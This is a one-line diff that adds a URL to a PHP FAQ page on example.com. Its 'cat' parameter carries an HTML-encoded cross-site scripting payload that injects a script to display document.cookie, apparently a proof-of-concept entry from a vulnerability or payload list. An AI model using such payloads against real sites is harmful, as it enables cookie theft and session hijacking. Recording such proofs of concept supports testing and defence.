@@ -1,0 +1,2 @@
+http://www.example.com/demos/net_marketing/faqs.php?cat=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
